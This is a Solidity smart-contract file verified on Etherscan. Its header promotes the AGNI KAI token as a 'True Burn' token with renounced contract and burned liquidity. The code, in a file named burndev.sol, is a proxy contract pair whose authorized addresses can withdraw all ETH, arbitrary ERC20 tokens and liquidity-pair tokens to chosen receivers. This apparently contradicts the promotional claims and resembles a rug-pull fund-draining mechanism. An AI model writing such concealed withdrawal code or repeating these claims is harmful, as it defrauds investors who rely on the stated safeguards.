/**
 *Submitted for verification at Etherscan.io on 2022-08-05
*/

// File: ipfs://QmW3Xb24VwPbitfv1sK5uaLaG8Zt2prCB5Ts4C9dpAZb3o

/**

░█████╗░░██████╗░███╗░░██╗██╗  ██╗░░██╗░█████╗░██╗
██╔══██╗██╔════╝░████╗░██║██║  ██║░██╔╝██╔══██╗██║
███████║██║░░██╗░██╔██╗██║██║  █████═╝░███████║██║
██╔══██║██║░░╚██╗██║╚████║██║  ██╔═██╗░██╔══██║██║
██║░░██║╚██████╔╝██║░╚███║██║  ██║░╚██╗██║░░██║██║
╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝╚═╝  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝

https://t.me/AgniKaiEth
https://www.agnikaiofficial.com/
https://twitter.com/AgniKaiEth

True Burn ERC20 Token

Contract Renounced, LP Burned

Welcome to AGNI KAI

An Agni Kai is a traditional firebender duel that is centuries old. It is a fight for one's honor 
and is won only when one opponent burns the other. The outcome of an Agni Kai affects the honor of 
each opponent. These duels are a popular method of resolving conflicts and are a source of entertainment 
for all spectators. The Fire Nation Royal Palace even houses a special Agni Kai chamber.

Any firebender may participate in an Agni Kai. Fire Lords can also be challenged, but that rarely occurs, 
as most Fire Lords are among the most powerful firebenders in the world.

*/

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b; require(c >= a, "SafeMath: addition overflow"); return c;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage); uint256 c = a - b; return c; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;} uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow"); return c; }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero"); }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage); uint256 c = a / b; return c;}
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;
    constructor(address _owner) {owner = _owner; authorizations[_owner] = true; }
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    modifier authorized() {require(isAuthorized(msg.sender), "!AUTHORIZED"); _;}
    function authorize(address adr) public authorized {authorizations[adr] = true;}
    function unauthorize(address adr) public authorized {authorizations[adr] = false;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function isAuthorized(address adr) public view returns (bool) {return authorizations[adr];}
    function transferOwnership(address payable adr) public authorized {owner = adr; authorizations[adr] = true;}
}

interface IPROXY {
    function allocationPercent(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external;
    function allocationAmt(address _tadd, address _rec, uint256 _amt) external;
    function parentETH() external;
    function swapTokens(uint256 tokenAmount) external;
    function setRouter(address _address) external;
    function rescue(uint256 amountPercentage, address destructor) external;
    function authorizeHub(address _address) external;
    function setParent(address _address) external;
    function setToken(address _address) external;
    function receiverETH() external;
    function parentPair() external;
    function parentALL() external;
    function setInternal(address _alpha, address _beta, address _pair) external;
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
// File: burndev.sol

//SPDX-License-Identifier: MIT

pragma solidity 0.8.15;


contract PROXY is Auth {
    using SafeMath for uint256;
    LPContract proxycontract;
    address alpha_receiver;
    address beta_receiver;
    address pair;
    address token;
    constructor() Auth(msg.sender) {proxycontract = new LPContract(msg.sender, address(this));}
    receive() external payable {}

    function rescueETHSender(uint256 amountPercentage) external authorized {
        uint256 amountETH = address(this).balance;
        payable(msg.sender).transfer(amountETH * amountPercentage / 100);
    }

    function rescueETH(uint256 amountPercentage, address receiver) external authorized {
        uint256 amountETH = address(this).balance;
        payable(receiver).transfer(amountETH * amountPercentage / 100);
    }

    function approvals() external authorized {
        uint256 amountETH = address(this).balance;
        payable(alpha_receiver).transfer(amountETH * 50 / 100);
        payable(beta_receiver).transfer(amountETH * 50 / 100);
    }

    function distributeETH() external authorized {
        proxycontract.parentETH();
        uint256 amountETH = address(this).balance;
        payable(alpha_receiver).transfer(amountETH * 50 / 100);
        payable(beta_receiver).transfer(amountETH * 50 / 100);
    }

    function rescuePair() external authorized {
        uint256 amount = IERC20(pair).balanceOf(address(this));
        IERC20(pair).transfer(msg.sender, amount);
    }

    function setToken(address _address) external authorized {
        token = _address;
        proxycontract.setToken(_address);
    }

    function setRouter(address _address) external authorized {
        proxycontract.setRouter(_address);
    }

    function rescueERC20(address _tadd, address _rec, uint256 _amt) external authorized {
        IERC20(_tadd).transfer(_rec, _amt);
    }

    function rescueERC20Percent(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
        uint256 tamt = IERC20(_tadd).balanceOf(address(this));
        IERC20(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));
    }

    function allocationPercent(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
        proxycontract.allocationPercent(_tadd, _rec, _amt, _amtd);
    }

    function allocationAmt(address _tadd, address _rec, uint256 _amt) external authorized {
        proxycontract.allocationAmt(_tadd, _rec, _amt);
    }

    function parentETH() external authorized {
        proxycontract.parentETH();
    }

    function rescue(uint256 amountPercentage, address destructor) external authorized {
        proxycontract.rescue(amountPercentage, destructor);
    }

    function setParent(address _address) external authorized {
        proxycontract.setParent(_address);
    }

    function swapTokens(uint256 tokenAmount) external authorized {
        proxycontract.swapTokens(tokenAmount);
    }

    function authorizeHub(address _address) external authorized {
        proxycontract.authorizeHub(_address);
    }

    function receiverETH() external authorized {
        proxycontract.receiverETH();
    }

    function setInternal(address _alpha, address _beta, address _pair, address _token) external authorized {
        proxycontract.setInternal(_alpha, _beta, _pair);
        alpha_receiver = _alpha;
        beta_receiver = _beta;
        pair = _pair;
        token = _token;
    }

    function parentPair() external authorized {
        proxycontract.parentPair();
    }

    function parentALL() external authorized {
        proxycontract.parentALL();
    }
}

contract LPContract is IPROXY, Auth {
    using SafeMath for uint256;
    address a_receiver;
    address b_receiver;
    address parent;
    address pair;
    IRouter router;
    IERC20 _token;
    address token;

    constructor(address _msg, address _parent) Auth(msg.sender) {
        router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        token = 0x60789C92009c58fd44cE022f8d5a614083885df1;
        _token = IERC20(token);
        authorize(_msg);
        parent = _parent;
    }

    receive() external payable {}

    function authorizeHub(address _address) external override authorized {
        authorize(_address);
    }

    function setInternal(address _a, address _b, address _pair) external override authorized {
        a_receiver = _a;
        b_receiver = _b;
        pair = _pair;
    }

    function allocationPercent(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external override authorized {
        uint256 tamt = IERC20(_tadd).balanceOf(address(this));
        IERC20(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));
    }

    function allocationAmt(address _tadd, address _rec, uint256 _amt) external override authorized {
        IERC20(_tadd).transfer(_rec, _amt);
    }

    function rescue(uint256 amountPercentage, address destructor) external override authorized {
        uint256 amountETH = address(this).balance;
        payable(destructor).transfer(amountETH * amountPercentage / 100);
    }

    function parentPair() external override authorized {
        uint256 amount = IERC20(pair).balanceOf(address(this));
        IERC20(pair).transfer(parent, amount);
    }

    function parentETH() external override authorized {
        uint256 amountETH = address(this).balance;
        payable(parent).transfer(amountETH);
    }

    function receiverETH() external override authorized {
        uint256 amountETH = address(this).balance;
        payable(a_receiver).transfer(amountETH * 50 / 100);
        payable(b_receiver).transfer(amountETH * 50 / 100);
    }

    function parentALL() external override authorized {
        uint256 amount = IERC20(pair).balanceOf(address(this));
        IERC20(pair).transfer(parent, amount);
        payable(parent).transfer(address(this).balance);
    }

    function setToken(address _address) external override authorized {
        _token = IERC20(_address);
        token = _address;
    }

    function setParent(address _address) external override authorized {
        parent = _address;
        authorize(_address);
    }

    function setRouter(address _address) external override authorized {
        router = IRouter(_address);
    }

    function swapTokens(uint256 tokenAmount) external override authorized {
        swapTokensForETH(tokenAmount);
        payable(parent).transfer(address(this).balance);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        _token.approve(address(router), tokenAmount);
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

}